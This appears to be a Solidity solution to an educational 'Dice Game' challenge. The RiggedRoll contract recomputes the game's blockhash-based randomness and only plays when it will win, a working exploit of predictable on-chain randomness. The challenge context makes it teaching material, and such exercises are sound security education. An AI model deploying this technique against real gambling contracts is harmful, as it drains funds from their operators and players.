pragma solidity >=0.8.0 <0.9.0; //Do not change the solidity version as it negativly impacts submission grading
//SPDX-License-Identifier: MIT

import { console } from "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {
	error RiggedRoll__LostRoll();

	DiceGame public diceGame;

	constructor(address payable diceGameAddress) {
		diceGame = DiceGame(diceGameAddress);
	}

	function withdraw(address _to, uint256 _amount) public onlyOwner {
		address payable to = payable(_to);
		to.transfer(_amount);
	}

	function riggedRoll() public {
		require(
			address(this).balance >= .002 ether,
			"Contract does not have enough funds"
		);

		bytes32 prevHash = blockhash(block.number - 1);
		bytes32 hash = keccak256(
			abi.encodePacked(prevHash, diceGame, diceGame.nonce())
		);
		uint256 roll = uint256(hash) % 16;

		if (roll <= 5) {
			diceGame.rollTheDice{ value: 0.002 ether }();
		} else {
			revert RiggedRoll__LostRoll();
		}
	}

	receive() external payable {}
}
